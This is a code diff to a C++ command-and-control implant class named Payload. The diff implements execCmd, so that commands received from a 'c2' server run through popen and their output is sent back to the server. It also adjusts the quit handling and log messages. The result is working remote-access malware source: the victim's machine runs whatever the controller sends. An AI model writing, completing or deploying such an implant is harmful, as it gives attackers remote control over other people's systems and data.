@@ -67,9 +67,9 @@ void Payload::handleConnection()
         auto cmd = rcvMsg();
         std::cout << "[+] Got cmd from c2: " << cmd << std::endl;
 
-        if (cmd == "quit")
+        if (cmd == "quit" || cmd.empty())
         {
-            std::cout << "[+] Quitting communication to c2 due to quit cmd.\n";
+            std::cout << "[+] Quitting communication to c2.\n";
             break;
         }
         else if (startsWith(cmd, "upload"))
@@ -99,9 +99,10 @@ void Payload::handleConnection()
         else
         {
             // execute cmd
-            std::cout << "[+] Executing due to server quit cmd.\n";
+            std::cout << "[+] Executing cmd...\n";
             auto output = execCmd(cmd);
             // and send to c2
+            std::cout << "[+] Sending output to server.\n";
             sendMsg(output);
         }
     }
@@ -174,8 +175,19 @@ void Payload::download(std::string& remoteFilePath, std::string& localFilePath)
     // TODO
 }
 
-std::string Payload::execCmd(std::string&)
+std::string Payload::execCmd(std::string& cmd)
 {
-    // TODO
-    return "";
+    std::array<char, 128> buffer{};
+    std::string result;
+    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
+    if (!pipe)
+    {
+        std::cerr << "[-] Cmd execution failed\n";
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
+    {
+        result += buffer.data();
+    }
+
+    return result;
 }
